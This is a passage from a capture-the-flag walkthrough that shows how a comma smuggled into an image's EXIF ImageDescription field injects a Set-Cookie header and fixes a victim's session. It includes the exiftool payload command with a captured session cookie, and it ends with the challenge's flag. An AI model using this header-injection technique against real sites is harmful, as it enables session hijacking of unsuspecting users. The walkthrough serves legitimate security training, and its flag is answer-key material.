This code attempts to read the EXIF data from the file if it is an image. Any discovered EXIF data is then stored in the metadata field using the CSV format we discovered earlier. The header keys are prepended with `X-CoverImage-`. If we upload an image with malicious exif data, we can inject our malicious header values later on. Note that we can't simply add an EXIF value named `Set-Cookie` since the `X-CoverImage-` will be prepended. Instead, we can inject an extra comma, causing the key-value pairs to be split an extra time. That is, we will add `ImageDescription` with the value `test,Set-Cookie,{cookievalue}`; this will be stored in the database as `ImageDescription,test,Set-Cookie,{cookievalue}` and then interpreted as two different header values!

Before we add EXIF data to an image, we first need to work out what our cookie value should be. While we could recreate this from inspecting our cookies and looking up how `Set-Cookie` is specified, we can instead just get the header value that is returned during login! Using Burpsuite again, this time navigate to the `HTTP History` option under the `Proxy` tab. You might have requests already logged there from before; if so, right click one of the logged requests, and select "Clear History".

Now, select `Open Browser` in the orange button to open the Burpsuite browser, and login to the Second Order site (if you are still logged in, go ahead and hit logout on the Second Order website). Now, simply log in to the site, and Burpsuite will capture that request. Now select the `POST` request to `/login`, and in the Response details, you'll see the `Set-Cookie` header that we received on login; copy that value to use as our payload.

![Capturing our login cookie using Burpsuite](./imgs/spy-loginCookie.png "Capturing our login cookie using Burpsuite")

Now open a terminal, use the following command to add our EXIF data to an image (if you need an image, you can use `curl http://pawn.secondorder.pccc/static/uploads/flag.jpg --output test.jpg` to download the Betsy Ross flag image we used earlier). Be sure to replace `test.jpg` with your image file name, and `{cookie-value}` with your cookie value.

```bash
exiftool -ImageDescription="test,Set-Cookie,{cookie-value}" test.jpg

# Example:
# exiftool -ImageDescription="test,Set-Cookie,session=.eJwljkFqQzEMRO_idRayZMlWLvORLYmWQAv_J6uQu9fQ5bx5MPMuR55xfZX783zFrRzfXu6FPaP50CCtQyEtiCZoFzEi50iqjVVwETQHbyCy2Kvo6MOsReUKkOBuAjxwzaUim_AEotobqlY12wX6RNpy54lpyZRgg8s-8rri_H_Td1zXmcfz9xE_Gyg47d2GPeawRO26clZmj_AUCpAtYC-fP0tqPk0.aXlBFQ.3iKV9Sb5e-dNe-lrvhGZmDESQWI; Domain=secondorder.pccc; HttpOnly; Path=/; SameSite=Lax" test.jpg
```

If you want to confirm it worked, you can use `exiftool test.jpg` and inspect the output for our value. Now, go to the warehouse, upload an item with this image, and then create the auction with the bad cover image on the pawn/auction side. After 10-20 seconds, the spy should view our new auction, and receive our injected header. The spy then performs the drop-off and creates the auction. If your attack was successful, you should see a new auction of an old laptop on your page that you did not create!

![Our dashboard with the spy's auction shown](./imgs/spy-newAuction.png "Our dashboard with the spy's auction shown")

Note that you can test your payload if needed by checking the headers to see what was extracted from the metadata. You can also test the payload by visiting the auction page from an incognito session (so you have no existing session cookie set) and then refreshing the page; if it worked, you should now be logged in. 

With that, simply view the auction for the old laptop and the token will be in the top right where the item description is (alternatively, you can view it on the warehouse page as well).

![The new auction created by the spy](./imgs/spy-token.png "The new auction created by the spy")

In this case, the token was `PCCC{Second_Order_Master_3295}`.
